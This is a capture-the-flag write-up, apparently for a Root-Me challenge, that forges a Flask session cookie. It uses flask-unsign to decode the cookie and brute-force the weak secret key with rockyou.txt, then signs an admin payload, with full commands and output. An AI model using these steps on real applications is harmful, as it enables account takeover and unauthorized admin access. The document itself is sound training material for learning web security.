First, we'll analyze session cookies.

In Flask, the default cookie session name is “session”.

To do this, we'll use `Flask-unsign`, executing the command :

flask-unsign --decode --cookie 'eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.ZWcbSg.GH7JKQrs4JnmRG8PMMdaBbc9g48'

Result:

{'admin': 'false', 'username': 'guest'}

This tells us a few things. We're a 'guest' user, and the admin boolean is set to false.

Our goal is to become an administrator. We're going to attempt to recover the secret key via a brute-force attack on the server.

flask-unsign --unsign --server 'http://challenge01.root-me.org:59084/' --wordlist rockyou.txt --no-literal-eval

We use the famous wordlist -> rockyou.txt

Result:

[*] Le serveur a renvoyé un code HTTP 200 (OK)
[+] Obtention réussie du cookie de session : eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.ZWcjwQ.qzXZFeW-KyVUJHoJiw0UhII-HbY
[*] La session se décode en : {'admin': 'false', 'username': 'guest'}
[*] Démarrage du brute-forcer avec 8 threads... 
[+] Clé secrète trouvée après 70144 tentatives 
b's3cr3t'

Bingo! In just a few seconds, we have the secret key: `'s3cr3t'`.

Now all we need to do is prepare our payload:

{'admin': 'true', 'username': 'admin'}

We sign our payload with our secret key:

flask-unsign --sign --cookie "{'admin': 'true', 'username': 'admin'}" --secret 's3cr3t'

Result:

eyJhZG1pbiI6InRydWUiLCJ1c2VybmFtZSI6ImFkbWluIn0.ZWckuA.CRCTZQZdCWArXiz73JogtdSn3KQ

All that's left is to modify the session cookie and send the request to retrieve the flag!

Good job, use this flag : [FLAG]

